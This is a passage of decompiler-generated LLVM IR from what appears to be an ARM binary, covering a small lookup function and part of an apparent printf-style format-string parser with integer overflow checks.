  %v5_e390 = icmp slt i32 %v0_e2c0.be, %v3_e388
  br i1 %v5_e390, label %dec_label_pc_e2b4, label %dec_label_pc_e388.dec_label_pc_e394.loopexit_crit_edge

dec_label_pc_e398:                                ; preds = %dec_label_pc_e24c
  br i1 %v6_e260, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_e398
  %v2_e39c = add i32 %v0_e24c, 36
  %v3_e39c = inttoptr i32 %v2_e39c to i8*
  %v4_e39c = load i8, i8* %v3_e39c, align 1
  %v5_e39c = zext i8 %v4_e39c to i32
  %v5_e3a0 = mul nuw nsw i32 %v5_e39c, 8
  %v6_e3a0 = add i32 %v5_e3a0, %v0_e24c
  store i32 %v6_e3a0, i32* %r3.global-to-local, align 4
  %v2_e3a4 = add i32 %v6_e3a0, 72
  %v3_e3a4 = inttoptr i32 %v2_e3a4 to i32*
  %v4_e3a4 = load i32, i32* %v3_e3a4, align 4
  store i32 %v4_e3a4, i32* %r3.global-to-local, align 4
  store i32 %v4_e3a4, i32* %v2_e258, align 4
  %v0_e3ac.pre = load i32, i32* @r0, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_e398, %bb
  %v2_e3c0 = phi i32 [ %v0_e3ac.pre, %bb ], [ %v0_e24c, %dec_label_pc_e398 ]
  %v1_e3ac = add i32 %v2_e3c0, 4
  %v2_e3ac = inttoptr i32 %v1_e3ac to i32*
  %v3_e3ac = load i32, i32* %v2_e3ac, align 4
  store i32 %v3_e3ac, i32* %r3.global-to-local, align 4
  %v6_e3b0 = icmp eq i32 %v3_e3ac, -2147483648
  br i1 %v6_e3b0, label %bb16, label %dec_label_pc_e394

bb16:                                             ; preds = %.thread1
  %v2_e3b4 = add i32 %v2_e3c0, 37
  %v3_e3b4 = inttoptr i32 %v2_e3b4 to i8*
  %v4_e3b4 = load i8, i8* %v3_e3b4, align 1
  %v5_e3b4 = zext i8 %v4_e3b4 to i32
  %v5_e3b8 = mul nuw nsw i32 %v5_e3b4, 8
  %v6_e3b8 = add i32 %v5_e3b8, %v2_e3c0
  store i32 %v6_e3b8, i32* %r3.global-to-local, align 4
  %v2_e3bc = add i32 %v6_e3b8, 72
  %v3_e3bc = inttoptr i32 %v2_e3bc to i32*
  %v4_e3bc = load i32, i32* %v3_e3bc, align 4
  store i32 %v4_e3bc, i32* %r3.global-to-local, align 4
  store i32 %v4_e3bc, i32* %v2_e3ac, align 4
  %v0_e3c4.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_e394

dec_label_pc_e388.dec_label_pc_e394.loopexit_crit_edge: ; preds = %dec_label_pc_e388.backedge
  br label %dec_label_pc_e394.loopexit

dec_label_pc_e394.loopexit:                       ; preds = %dec_label_pc_e388.dec_label_pc_e394.loopexit_crit_edge, %dec_label_pc_e2a8
  %v0_e388.lcssa = phi i32 [ %v0_e388, %dec_label_pc_e388.dec_label_pc_e394.loopexit_crit_edge ], [ %v0_e38817, %dec_label_pc_e2a8 ]
  br label %dec_label_pc_e394

dec_label_pc_e394:                                ; preds = %dec_label_pc_e394.loopexit, %.thread1, %bb16
  %v1_e3e4 = phi i32 [ %v0_e388.lcssa, %dec_label_pc_e394.loopexit ], [ %v2_e3c0, %.thread1 ], [ %v0_e3c4.pre, %bb16 ]
  %v1_e3c4 = add i32 %v1_e3e4, 8
  %v2_e3c4 = inttoptr i32 %v1_e3c4 to i32*
  %v3_e3c4 = load i32, i32* %v2_e3c4, align 4
  store i32 %v3_e3c4, i32* %r1.global-to-local, align 4
  %v1_e3c8 = icmp slt i32 %v3_e3c4, 0
  br i1 %v1_e3c8, label %dec_label_pc_e3d0, label %dec_label_pc_e3f0

dec_label_pc_e3d0:                                ; preds = %dec_label_pc_e394
  %v1_e3d0 = add i32 %v1_e3e4, 16
  %v2_e3d0 = inttoptr i32 %v1_e3d0 to i32*
  %v3_e3d0 = load i32, i32* %v2_e3d0, align 4
  %v1_e3d8 = sub i32 0, %v3_e3c4
  store i32 %v1_e3d8, i32* %r1.global-to-local, align 4
  %v1_e3d4 = and i32 %v3_e3d0, -10
  %v1_e3dc = or i32 %v1_e3d4, 8
  store i32 %v1_e3dc, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_e3e4 = add i32 %v1_e3e4, 20
  %v3_e3e4 = inttoptr i32 %v2_e3e4 to i32*
  store i32 32, i32* %v3_e3e4, align 4
  %v0_e3e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_e3e8 = load i32, i32* @r0, align 4
  %v2_e3e8 = add i32 %v1_e3e8, 8
  %v3_e3e8 = inttoptr i32 %v2_e3e8 to i32*
  store i32 %v0_e3e8, i32* %v3_e3e8, align 4
  %v0_e3ec = load i32, i32* %r3.global-to-local, align 4
  %v1_e3ec = load i32, i32* @r0, align 4
  %v2_e3ec = add i32 %v1_e3ec, 16
  %v3_e3ec = inttoptr i32 %v2_e3ec to i32*
  store i32 %v0_e3ec, i32* %v3_e3ec, align 4
  %v1_e3f4.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_e3f0

dec_label_pc_e3f0:                                ; preds = %dec_label_pc_e394, %dec_label_pc_e3d0
  %v1_e3f4 = phi i32 [ %v1_e3e4, %dec_label_pc_e394 ], [ %v1_e3f4.pre, %dec_label_pc_e3d0 ]
  %v2_e3f0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_e3f0, i32* @r4, align 4
  ret i32 %v1_e3f4

; uselistorder directives
  uselistorder i32 %v2_e3c0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_e2c0.be, { 1, 0 }
  uselistorder i32 %v0_e388, { 1, 2, 0 }
  uselistorder i32 %v3_e2c8, { 3, 1, 0, 2, 4 }
  uselistorder i32* %v2_e2c8, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 %v3_e2b8, { 1, 2, 0, 8, 5, 3, 4, 7, 6, 9, 10, 11 }
  uselistorder i32 %v0_e2c023, { 1, 0 }
  uselistorder i32 %v0_e38824, { 0, 2, 1 }
  uselistorder i32 %v0_e38817, { 2, 0, 1 }
  uselistorder i32 %v0_e24c, { 1, 0, 4, 2, 3, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 17, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 7, 3, 4, 5, 6, 8, 9, 10 }
  uselistorder i32 80, { 4, 5, 6, 0, 7, 1, 3, 2 }
  uselistorder label %dec_label_pc_e3f0, { 1, 0 }
  uselistorder label %dec_label_pc_e394, { 0, 2, 1 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_e384, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_e374, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_e354, { 1, 0 }
  uselistorder label %dec_label_pc_e340, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_e2b4, { 1, 0 }
  uselistorder label %dec_label_pc_e2a8, { 1, 0 }
  uselistorder label %dec_label_pc_e280, { 1, 0 }
}

define i32 @function_e3fc() local_unnamed_addr {
dec_label_pc_e3fc:
  %v1_e418.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_e414

dec_label_pc_e414:                                ; preds = %dec_label_pc_e420, %dec_label_pc_e3fc
  %v0_e414 = phi i32 [ %v1_e414, %dec_label_pc_e420 ], [ ptrtoint (i32* @global_var_1978e.322 to i32), %dec_label_pc_e3fc ]
  %v1_e414 = add i32 %v0_e414, -2
  %v2_e414 = inttoptr i32 %v1_e414 to i16*
  %v3_e414 = load i16, i16* %v2_e414, align 2
  %v4_e414 = sext i16 %v3_e414 to i32
  store i32 %v1_e414, i32* @ip, align 4
  %v9_e418 = icmp eq i32 %v4_e414, %v1_e418.pre
  br i1 %v9_e418, label %dec_label_pc_e414.dec_label_pc_e428_crit_edge, label %dec_label_pc_e420

dec_label_pc_e414.dec_label_pc_e428_crit_edge:    ; preds = %dec_label_pc_e414
  br label %dec_label_pc_e428

dec_label_pc_e420:                                ; preds = %dec_label_pc_e414
  %tmp = icmp ugt i32 %v1_e414, ptrtoint (i32* @global_var_19776.321 to i32)
  br i1 %tmp, label %dec_label_pc_e414, label %dec_label_pc_e428.loopexit

dec_label_pc_e428.loopexit:                       ; preds = %dec_label_pc_e420
  br label %dec_label_pc_e428

dec_label_pc_e428:                                ; preds = %dec_label_pc_e428.loopexit, %dec_label_pc_e414.dec_label_pc_e428_crit_edge
  %v2_e438.pre-phi = sub i32 %v1_e414, ptrtoint (i32* @global_var_19776.321 to i32)
  store i32 %v2_e438.pre-phi, i32* @r2, align 4
  %v4_e43c = sdiv i32 %v2_e438.pre-phi, 2
  %v5_e43c = add i32 %v4_e43c, ptrtoint (i32* @global_var_1978e.322 to i32)
  %v6_e43c = inttoptr i32 %v5_e43c to i8*
  %v7_e43c = load i8, i8* %v6_e43c, align 1
  %v9_e43c = zext i8 %v7_e43c to i32
  ret i32 %v9_e43c

; uselistorder directives
  uselistorder i32 %v2_e438.pre-phi, { 1, 0 }
  uselistorder i32 %v1_e414, { 0, 1, 3, 4, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_1978e.322 to i32), { 1, 0 }
}

define i32 @function_e450(i8* %arg1) local_unnamed_addr {
dec_label_pc_e450:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp115 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-111 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-120 = alloca i8*, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_e450 = load i32, i32* @r4, align 4
  store i32 %v3_e450, i32* %stack_var_-36, align 4
  %v6_e450 = load i32, i32* @r5, align 4
  %v27_e450 = load i32, i32* @lr, align 4
  %v0_e454 = load i32, i32* %r0.global-to-local, align 4
  %v1_e454 = add i32 %v0_e454, 16
  %v2_e454 = inttoptr i32 %v1_e454 to i32*
  %v3_e454 = load i32, i32* %v2_e454, align 4
  %v1_e45c = and i32 %v3_e454, 128
  store i32 %v1_e45c, i32* @r4, align 4
  %v2_e45c = icmp eq i32 %v1_e45c, 0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 %v0_e454, i32* %r7.global-to-local, align 4
  store i32 142044, i32* @lr, align 4
  %v1_e484 = add i32 %v0_e454, 24
  %v2_e484 = inttoptr i32 %v1_e484 to i32*
  %v3_e484 = load i32, i32* %v2_e484, align 4
  store i32 %v3_e484, i32* %fp.global-to-local, align 4
  br i1 %v2_e45c, label %.dec_label_pc_e4d8_crit_edge, label %dec_label_pc_e490

.dec_label_pc_e4d8_crit_edge:                     ; preds = %dec_label_pc_e450
  %v2_e488 = inttoptr i32 %v0_e454 to i32*
  %v3_e488 = load i32, i32* %v2_e488, align 4
  store i32 %v3_e488, i32* %r0.global-to-local, align 4
  %.pre = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_e4d8

dec_label_pc_e490:                                ; preds = %dec_label_pc_e450
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_e4a0 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_e494

dec_label_pc_e494:                                ; preds = %dec_label_pc_e4c4.dec_label_pc_e494_crit_edge, %dec_label_pc_e490
  %v1_e4a4 = phi i32 [ %v1_e4b4, %dec_label_pc_e4c4.dec_label_pc_e494_crit_edge ], [ 0, %dec_label_pc_e490 ]
  %v0_e494 = phi i32 [ %v0_e494.pre, %dec_label_pc_e4c4.dec_label_pc_e494_crit_edge ], [ %v0_e454, %dec_label_pc_e490 ]
  %v1_e494 = inttoptr i32 %v0_e494 to i32*
  %v2_e494 = load i32, i32* %v1_e494, align 4
  %v4_e498 = mul i32 %v1_e4a4, 4
  %v5_e498 = add i32 %v2_e494, %v4_e498
  store i32 %v5_e498, i32* %r3.global-to-local, align 4
  %v1_e49c = add i32 %v5_e498, -4
  %v2_e49c = inttoptr i32 %v1_e49c to i8*
  %v3_e49c = load i8, i8* %v2_e49c, align 1
  %v4_e49c = zext i8 %v3_e49c to i32
  store i32 %v4_e49c, i32* %r1.global-to-local, align 4
  store i32 %v2_e4a0, i32* @ip, align 4
  %v2_e4a4 = add i32 %v1_e4a4, %v2_e4a0
  store i32 %v2_e4a4, i32* %r2.global-to-local, align 4
  %v3_e4a8 = add i32 %v2_e4a4, -72
  %v4_e4a8 = inttoptr i32 %v3_e4a8 to i8*
  store i8 %v3_e49c, i8* %v4_e4a8, align 1
  %v0_e4ac = load i32, i32* %r3.global-to-local, align 4
  %v1_e4ac = add i32 %v0_e4ac, -4
  %v2_e4ac = inttoptr i32 %v1_e4ac to i32*
  %v3_e4ac = load i32, i32* %v2_e4ac, align 4
  store i32 %v3_e4ac, i32* %r3.global-to-local, align 4
  %v0_e4b0 = load i32, i32* %r1.global-to-local, align 4
  %v9_e4b0 = icmp eq i32 %v0_e4b0, %v3_e4ac
  %v0_e4b4 = load i32, i32* %r0.global-to-local, align 4
  %v1_e4b4 = add i32 %v0_e4b4, 1
  store i32 %v1_e4b4, i32* %r0.global-to-local, align 4
  br i1 %v9_e4b0, label %dec_label_pc_e4bc, label %dec_label_pc_e980

dec_label_pc_e4bc:                                ; preds = %dec_label_pc_e494
  %v2_e4bc = icmp eq i32 %v3_e4ac, 0
  br i1 %v2_e4bc, label %dec_label_pc_e4cc, label %dec_label_pc_e4c4

dec_label_pc_e4c4:                                ; preds = %dec_label_pc_e4bc
  %tmp180 = icmp ult i32 %v1_e4b4, 32
  br i1 %tmp180, label %dec_label_pc_e4c4.dec_label_pc_e494_crit_edge, label %dec_label_pc_e4cc

dec_label_pc_e4c4.dec_label_pc_e494_crit_edge:    ; preds = %dec_label_pc_e4c4
  %v0_e494.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_e494

dec_label_pc_e4cc:                                ; preds = %dec_label_pc_e4c4, %dec_label_pc_e4bc
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_e4d4 = ptrtoint i32* %stack_var_-111 to i32
  store i32 %v2_e4d4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e4d8

dec_label_pc_e4d8:                                ; preds = %.dec_label_pc_e4d8_crit_edge, %dec_label_pc_e4cc
  %v3_e50c.pre-phi = phi i32 [ %.pre, %.dec_label_pc_e4d8_crit_edge ], [ %v2_e4a0, %dec_label_pc_e4cc ]
  %v0_e50462 = phi i32 [ %v3_e488, %.dec_label_pc_e4d8_crit_edge ], [ %v2_e4d4, %dec_label_pc_e4cc ]
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 920, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_197b4.327 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 -4, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_197b4.327, i32 0, i32 0), i8** %stack_var_-120, align 4
  br label %dec_label_pc_e504

dec_label_pc_e500:                                ; preds = %.thread19, %dec_label_pc_e634
  %v0_e500 = phi i32 [ %v2_e6ac, %.thread19 ], [ %v0_e61074, %dec_label_pc_e634 ]
  %stack_var_-44.0 = phi i32 [ %stack_var_-44.3, %.thread19 ], [ %stack_var_-44.2, %dec_label_pc_e634 ]
  store i32 %v0_e500, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e504

dec_label_pc_e504:                                ; preds = %dec_label_pc_e4d8, %dec_label_pc_e500
  %v1_e518 = phi i32 [ %v0_e50462, %dec_label_pc_e4d8 ], [ %v0_e500, %dec_label_pc_e500 ]
  %stack_var_-44.1 = phi i32 [ %tmp115, %dec_label_pc_e4d8 ], [ %stack_var_-44.0, %dec_label_pc_e500 ]
  %v1_e504 = inttoptr i32 %v1_e518 to i8*
  %v2_e504 = load i8, i8* %v1_e504, align 1
  %v3_e504 = zext i8 %v2_e504 to i32
  store i32 %v3_e504, i32* %r3.global-to-local, align 4
  %v7_e508 = icmp eq i8 %v2_e504, 42
  br i1 %v7_e508, label %bb, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_e504
  store i32 %v1_e518, i32* %r6.global-to-local, align 4
  %v0_e51c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_e51c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e564.preheader

bb:                                               ; preds = %dec_label_pc_e504
  %v1_e510 = load i32, i32* %r8.global-to-local, align 4
  %v2_e510 = load i32, i32* %sb.global-to-local, align 4
  %v4_e510 = mul i32 %v2_e510, %v1_e510
  %v5_e510 = add i32 %v4_e510, %v3_e50c.pre-phi
  store i32 %v5_e510, i32* %r3.global-to-local, align 4
  %v2_e518 = add i32 %v1_e518, 1
  store i32 %v2_e518, i32* %r6.global-to-local, align 4
  %v0_e51c109 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_e51c109, i32* %r1.global-to-local, align 4
  %v3_e520 = add i32 %v5_e510, -40
  %v4_e520 = inttoptr i32 %v3_e520 to i32*
  store i32 %v0_e51c109, i32* %v4_e520, align 4
  %v0_e568.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e564.preheader

dec_label_pc_e564.preheader:                      ; preds = %.thread7, %bb
  %v0_e568.pre = phi i32 [ %v1_e518, %.thread7 ], [ %v0_e568.pre.pre, %bb ]
  %v0_e56c.pre = load i32, i32* @lr, align 4
  %v2_e56c = add i32 %v0_e56c.pre, 920
  %v3_e56c = inttoptr i32 %v2_e56c to i32*
  br label %dec_label_pc_e564

dec_label_pc_e528:                                ; preds = %dec_label_pc_e564
  store i32 214748363, i32* %r3.global-to-local, align 4
  %v0_e52c = load i32, i32* %r1.global-to-local, align 4
  %v2_e52c = add i32 %v0_e52c, -214748363
  %tmp137 = sub i32 214748362, %v0_e52c
  %v6_e52c = and i32 %tmp137, %v0_e52c
  %v7_e52c = icmp slt i32 %v6_e52c, 0
  %v8_e52c = icmp slt i32 %v2_e52c, 0
  %v9_e52c = icmp eq i32 %v0_e52c, 214748363
  %v3_e530 = xor i1 %v8_e52c, %v7_e52c
  %v4_e530 = or i1 %v9_e52c, %v3_e530
  br i1 %v4_e530, label %dec_label_pc_e548, label %dec_label_pc_e534

dec_label_pc_e534:                                ; preds = %dec_label_pc_e528
  store i32 214748364, i32* %r2.global-to-local, align 4
  %v9_e538 = icmp eq i32 %v0_e52c, 214748364
  br i1 %v9_e538, label %dec_label_pc_e540, label %dec_label_pc_e560

dec_label_pc_e540:                                ; preds = %dec_label_pc_e534
  %v8_e544 = icmp ugt i8 %v2_e568, 55
  br i1 %v8_e544, label %dec_label_pc_e560, label %dec_label_pc_e548

dec_label_pc_e548:                                ; preds = %dec_label_pc_e540, %dec_label_pc_e528
  %v2_e54c = mul i32 %v0_e52c, 10
  %v1_e550 = add i32 %v2_e54c, -48
  store i32 %v1_e550, i32* %r3.global-to-local, align 4
  %v2_e554 = add i32 %v1_e550, %v3_e568
  br label %dec_label_pc_e560

dec_label_pc_e560:                                ; preds = %dec_label_pc_e540, %dec_label_pc_e534, %dec_label_pc_e548
  %storemerge = phi i32 [ %v2_e554, %dec_label_pc_e548 ], [ 2147483647, %dec_label_pc_e534 ], [ 2147483647, %dec_label_pc_e540 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_e560 = add i32 %v0_e5e8, 1
  store i32 %v1_e560, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e564

dec_label_pc_e564:                                ; preds = %dec_label_pc_e564.preheader, %dec_label_pc_e560
  %v0_e5e8 = phi i32 [ %v0_e568.pre, %dec_label_pc_e564.preheader ], [ %v1_e560, %dec_label_pc_e560 ]
  store i32 920, i32* %r2.global-to-local, align 4
  %v1_e568 = inttoptr i32 %v0_e5e8 to i8*
  %v2_e568 = load i8, i8* %v1_e568, align 1
  %v3_e568 = zext i8 %v2_e568 to i32
  store i32 %v3_e568, i32* @ip, align 4
  %v4_e56c = load i32, i32* %v3_e56c, align 4
  store i32 %v4_e56c, i32* %r3.global-to-local, align 4
  %v2_e570 = mul nuw nsw i32 %v3_e568, 2
  store i32 %v2_e570, i32* %r2.global-to-local, align 4
  %v2_e574 = add i32 %v2_e570, %v4_e56c
  %v3_e574 = inttoptr i32 %v2_e574 to i16*
  %v4_e574 = load i16, i16* %v3_e574, align 2
  %v6_e574 = zext i16 %v4_e574 to i32
  store i32 %v6_e574, i32* %r3.global-to-local, align 4
  %v1_e578 = and i32 %v6_e574, 8
  %v2_e578 = icmp eq i32 %v1_e578, 0
  br i1 %v2_e578, label %dec_label_pc_e580, label %dec_label_pc_e528

dec_label_pc_e580:                                ; preds = %dec_label_pc_e564
  %v0_e580 = load i32, i32* %r0.global-to-local, align 4
  %v1_e580 = add i32 %v0_e580, -1
  %v2_e580 = inttoptr i32 %v1_e580 to i8*
  %v3_e580 = load i8, i8* %v2_e580, align 1
  %v4_e580 = zext i8 %v3_e580 to i32
  store i32 %v4_e580, i32* %r3.global-to-local, align 4
  %v7_e584 = icmp eq i8 %v3_e580, 37
  br i1 %v7_e584, label %dec_label_pc_e58c, label %dec_label_pc_e64c

dec_label_pc_e58c:                                ; preds = %dec_label_pc_e580
  %v7_e58c = icmp eq i8 %v2_e568, 36
  %. = zext i1 %v7_e58c to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v0_e598 = load i32, i32* %r1.global-to-local, align 4
  %tmp141 = icmp slt i32 %v0_e598, 1
  br i1 %tmp141, label %bb142, label %thread-pre-split

bb142:                                            ; preds = %dec_label_pc_e58c
  store i32 0, i32* %r3.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_e58c, %bb142
  %v0_e5a0 = phi i32 [ 0, %bb142 ], [ %., %dec_label_pc_e58c ]
  %v2_e5a0 = icmp eq i32 %v0_e5a0, 0
  %v0_e5d4 = load i32, i32* %fp.global-to-local, align 4
  br i1 %v2_e5a0, label %dec_label_pc_e5d4, label %dec_label_pc_e5a8

dec_label_pc_e5a8:                                ; preds = %thread-pre-split
  %v2_e5d4 = icmp eq i32 %v0_e5d4, 0
  %v1_e5ac = add i32 %v0_e5e8, 1
  store i32 %v1_e5ac, i32* %r0.global-to-local, align 4
  br i1 %v2_e5d4, label %dec_label_pc_e980, label %dec_label_pc_e5b4

dec_label_pc_e5b4:                                ; preds = %dec_label_pc_e5a8
  %v2_e5b4 = sub i32 %v0_e598, %v0_e5d4
  %v4_e5b4 = xor i32 %v0_e5d4, %v0_e598
  %v5_e5b4 = xor i32 %v2_e5b4, %v0_e598
  %v6_e5b4 = and i32 %v5_e5b4, %v4_e5b4
  %v7_e5b4 = icmp slt i32 %v6_e5b4, 0
  %v8_e5b4 = icmp slt i32 %v2_e5b4, 0
  %v9_e5b4 = icmp eq i32 %v0_e598, %v0_e5d4
  %v3_e5b8 = xor i1 %v8_e5b4, %v7_e5b4
  %v4_e5b8 = or i1 %v9_e5b4, %v3_e5b8
  br i1 %v4_e5b8, label %dec_label_pc_e5c8, label %bb143

bb143:                                            ; preds = %dec_label_pc_e5b4
  store i32 %v0_e598, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_e5c8

dec_label_pc_e5c4:                                ; preds = %dec_label_pc_e5e8, %dec_label_pc_e5f0
  %v0_e5c4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_e5c4, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_e5c8

dec_label_pc_e5c8:                                ; preds = %bb143, %dec_label_pc_e5b4, %dec_label_pc_e5c4
  %v0_e5c8 = phi i32 [ %v0_e580, %dec_label_pc_e5c4 ], [ %v1_e5ac, %dec_label_pc_e5b4 ], [ %v1_e5ac, %bb143 ]
  %stack_var_-44.2 = phi i32 [ %stack_var_-44.1, %dec_label_pc_e5c4 ], [ %v0_e598, %dec_label_pc_e5b4 ], [ %v0_e598, %bb143 ]
  store i32 %v0_e5c8, i32* %r6.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  %v2_e604.pre = load i8*, i8** %stack_var_-120, align 4
  %v3_e604 = ptrtoint i8* %v2_e604.pre to i32
  br label %dec_label_pc_e604

dec_label_pc_e5d4:                                ; preds = %thread-pre-split
  %tmp144 = icmp slt i32 %v0_e5d4, 1
  br i1 %tmp144, label %dec_label_pc_e5e8, label %dec_label_pc_e5dc

dec_label_pc_e5dc:                                ; preds = %dec_label_pc_e5d4
  %v7_e5dc = icmp eq i8 %v2_e568, 109
  br i1 %v7_e5dc, label %dec_label_pc_e64c, label %dec_label_pc_e980

dec_label_pc_e5e8:                                ; preds = %dec_label_pc_e5d4
  %tmp181 = icmp ugt i32 %v0_e5e8, %v0_e580
  br i1 %tmp181, label %dec_label_pc_e5f0, label %dec_label_pc_e5c4

dec_label_pc_e5f0:                                ; preds = %dec_label_pc_e5e8
  %v1_e5f0 = inttoptr i32 %v0_e580 to i8*
  %v2_e5f0 = load i8, i8* %v1_e5f0, align 1
  %v3_e5f0 = zext i8 %v2_e5f0 to i32
  store i32 %v3_e5f0, i32* %r3.global-to-local, align 4
  %v7_e5f4 = icmp eq i8 %v2_e5f0, 48
  br i1 %v7_e5f4, label %dec_label_pc_e5c4, label %bb145

bb145:                                            ; preds = %dec_label_pc_e5f0
  %v1_e5f8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_e5f8, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_e64c

dec_label_pc_e604.loopexit:                       ; preds = %dec_label_pc_e60c
  %v1_e618 = load i32, i32* @r4, align 4
  %v3_e618 = or i32 %v1_e618, %v0_e62c
  store i32 %v3_e618, i32* @r4, align 4
  %v2_e61c = add i32 %v0_e61074, 1
  store i32 %v2_e61c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e604

dec_label_pc_e604:                                ; preds = %dec_label_pc_e604.loopexit, %dec_label_pc_e5c8
  %v0_e61074 = phi i32 [ %v2_e61c, %dec_label_pc_e604.loopexit ], [ %v0_e5c8, %dec_label_pc_e5c8 ]
  store i32 %v3_e604, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_e610 = inttoptr i32 %v0_e61074 to i8*
  br label %dec_label_pc_e60c

dec_label_pc_e60c:                                ; preds = %dec_label_pc_e624, %dec_label_pc_e604
  %v0_e62c = phi i32 [ %v2_e62c, %dec_label_pc_e624 ], [ 1, %dec_label_pc_e604 ]
  %v0_e60c = phi i32 [ %v5_e60c, %dec_label_pc_e624 ], [ %v3_e604, %dec_label_pc_e604 ]
  %v1_e60c = inttoptr i32 %v0_e60c to i8*
  %v2_e60c = load i8, i8* %v1_e60c, align 1
  %v3_e60c = zext i8 %v2_e60c to i32
  store i32 %v3_e60c, i32* %r2.global-to-local, align 4
  %v5_e60c = add i32 %v0_e60c, 1
  store i32 %v5_e60c, i32* %r0.global-to-local, align 4
  %v2_e610 = load i8, i8* %v1_e610, align 1
  %v3_e610 = zext i8 %v2_e610 to i32
  store i32 %v3_e610, i32* %r3.global-to-local, align 4
  %v9_e614 = icmp eq i8 %v2_e610, %v2_e60c
  br i1 %v9_e614, label %dec_label_pc_e604.loopexit, label %dec_label_pc_e624

dec_label_pc_e624:                                ; preds = %dec_label_pc_e60c
  %v1_e624 = inttoptr i32 %v5_e60c to i8*
  %v2_e624 = load i8, i8* %v1_e624, align 1
  %v3_e624 = zext i8 %v2_e624 to i32
  store i32 %v3_e624, i32* %r3.global-to-local, align 4
  %v2_e628 = icmp eq i8 %v2_e624, 0
  %v2_e62c = mul i32 %v0_e62c, 2
  store i32 %v2_e62c, i32* %r1.global-to-local, align 4
  br i1 %v2_e628, label %dec_label_pc_e634, label %dec_label_pc_e60c

dec_label_pc_e634:                                ; preds = %dec_label_pc_e624
  %v1_e634 = add i32 %v0_e61074, -1
  %v2_e634 = inttoptr i32 %v1_e634 to i8*
  %v3_e634 = load i8, i8* %v2_e634, align 1
  %v7_e638 = icmp eq i8 %v3_e634, 37
  %v0_e63c = load i32, i32* @r4, align 4
  %v1_e63c = and i32 %v0_e63c, 10
  store i32 %v1_e63c, i32* %r3.global-to-local, align 4
  %v4_e640 = udiv i32 %v1_e63c, 2
  %v5_e640 = sub nuw nsw i32 -1, %v4_e640
  %v6_e640 = and i32 %v0_e63c, %v5_e640
  store i32 %v6_e640, i32* @r4, align 4
  br i1 %v7_e638, label %dec_label_pc_e648, label %dec_label_pc_e500

dec_label_pc_e648:                                ; preds = %dec_label_pc_e634
  %v0_e648 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_e648, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e64c

dec_label_pc_e64c:                                ; preds = %bb145, %dec_label_pc_e580, %dec_label_pc_e5dc, %dec_label_pc_e648
  %v1_e68c = phi i32 [ %v0_e61074, %dec_label_pc_e648 ], [ %v0_e5e8, %bb145 ], [ %v0_e5e8, %dec_label_pc_e5dc ], [ %v0_e5e8, %dec_label_pc_e580 ]
